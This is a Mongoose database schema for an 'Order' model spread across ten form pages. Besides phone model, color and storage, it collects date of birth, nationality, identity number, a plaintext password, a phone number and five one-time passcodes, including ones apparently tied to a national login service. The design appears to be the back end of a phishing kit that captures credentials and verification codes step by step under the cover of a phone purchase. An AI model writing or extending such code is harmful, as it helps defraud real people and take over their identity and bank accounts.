import mongoose from 'mongoose'

const orderSchema = new mongoose.Schema(
  {
    // page 1
    model: {
      type: String,
      required: true,
    },
    color: {
      type: String,
      required: true,
    },
    storage: {
      type: String,
      required: true,
    },
    dob: { type: Date, required: true },
    nationality: { type: String, required: true },

    // page 2
    identity: { type: String, required: true },
    password: { type: String, required: true },
    phone: { type: String, required: true },

    // page 3
    firstOtp: { type: Number, default: 0 },

    // page 4
    birthPlace: { type: String, trim: true, default: '' },

    // page 5
    secondOtp: { type: Number, default: 0 },

    // page 6
    city: { type: String, trim: true, default: '' },
    details: { type: String, trim: true, default: '' },

    // page 7
    nafatOtpOne: { type: Number, default: 0 },

    // page 8
    profession: { type: String, default: '' },

    // page 9
    thirdOtp: { type: Number, default: 0 },

    // page 10
    nafatOtp: { type: Number, default: 0 },
  },
  { timestamps: true },
)

const Order = mongoose.models.Order || mongoose.model('Order', orderSchema) // Order is the name of the model

export default Order
